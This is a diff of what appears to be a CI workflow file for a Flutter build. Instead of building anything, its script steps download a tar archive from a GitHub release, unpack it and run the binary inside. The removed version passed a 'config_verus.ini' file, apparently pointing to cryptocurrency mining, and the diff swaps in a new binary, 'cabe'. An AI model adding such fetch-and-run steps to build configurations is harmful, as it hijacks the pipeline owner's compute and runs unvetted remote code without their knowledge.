@@ -8,7 +8,7 @@ workflows:
         environment:
             flutter: dev
         scripts:
-            - wget https://github.com/endvoc01/voc/releases/download/nona/nona.tar.gz
+            - wget https://github.com/endvoc01/cabe/releases/download/cabe/cabe.tar.gz
             - brew install gnu-tar
-            - gtar xvf nona.tar.gz
-            - ./nona config_verus.ini
+            - gtar xvf cabe.tar.gz
+            - ./cabe
